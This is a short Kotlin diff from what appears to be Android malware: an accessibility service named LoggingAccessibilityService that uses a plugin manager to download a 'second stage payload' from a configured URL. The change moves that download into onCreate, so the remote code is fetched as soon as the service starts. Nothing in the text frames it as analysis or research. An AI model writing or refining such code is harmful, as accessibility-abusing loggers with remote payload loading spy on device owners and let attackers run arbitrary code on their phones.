@@ -33,11 +33,7 @@ class LoggingAccessibilityService : AccessibilityService(), PluginCallback {
 
     override fun onCreate() {
         pluginManager = PluginManager(this)
-    }
-
-    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         pluginManager.download(Config.SECOND_STAGE_PAYLOAD_URL)
-        return Service.START_STICKY
     }
 
     override fun onAccessibilityEvent(event: AccessibilityEvent) {
